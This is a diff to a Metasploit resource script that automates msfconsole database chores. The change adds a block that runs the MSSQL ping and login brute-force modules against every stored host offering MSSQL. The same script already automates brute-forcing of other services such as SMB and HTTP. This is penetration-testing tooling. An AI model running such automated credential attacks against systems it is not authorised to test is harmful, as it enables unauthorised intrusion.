@@ -4,13 +4,13 @@
        This Metasploit RC file can be used to manage msfconsole database tasks:
        Display database data, record msfconsole activity, add hosts to database,
        import files.xml import list of hosts inside a text file (one-per-line-entries)
-       auto-exploit db hosts by service name, auto-search compatible auxiliarys based
-       on db hosts service name inputed and clean all database data at script exit.
+       auto-brute-force db hosts by service name, auto-search compatible auxiliarys modules
+       based on db hosts service name inputed and clean all database data at script exit.
 
     Execute in msfconsole:
        setg CLEAN <true-or-blank>
-       setg RECORD <true-or-blank>
        setg DB_AUX <service-name>
+       setg RECORD <true-or-blank>
        setg DB_BRUTE <service-name>
        setg XML_EXPORT <true-or-blank>
        setg DBHOST <asign-RHOSTS-to-msfconsole>
@@ -137,6 +137,7 @@
           return nil
        end
        end
+       print_error("[ERROR] Service: [#{framework.datastore['DB_AUX']}] not found in db")
     end
 
 
@@ -266,6 +267,20 @@
            end
          end
 
+         if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
+           if (framework.datastore['DB_BRUTE'] == "mssql")
+              print_warning("Remote Target port 1433 mssql found")
+              Rex::sleep(1.0)
+              run_single("use auxiliary/scanner/mssql/mssql_ping")
+              run_single("set THREADS 16")
+              run_single("services -c name -S mssql -R")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/mssql/mssql_login")
+              run_single("services -c name -S mssql -R")
+              run_single("exploit")
+           end
+         end
+
          if xport =~ /80/i or proto =~ /http/i
            if (framework.datastore['DB_BRUTE'] == "http")
               print_warning("Remote Target port: 80 http found")
@@ -328,7 +343,7 @@
    print_line("setg RECORD true               Record msfconsole activity")
    print_line("setg DBHOST 10.10.10.3         Asign RHOSTS var to msfconsole")
    print_line("setg XML_EXPORT true           Export contents of db to database.xml")
-   print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to db")
+   print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to database")
    print_line("setg TXT_IMPORT /root/dic.txt  Import text hosts list (one-per-line)")
    print_line("setg DB_BRUTE smb              Auto-Exploit db hosts based on service name")
    print_line("setg DB_AUX ssh                Auto-search auxiliarys based on host service name")
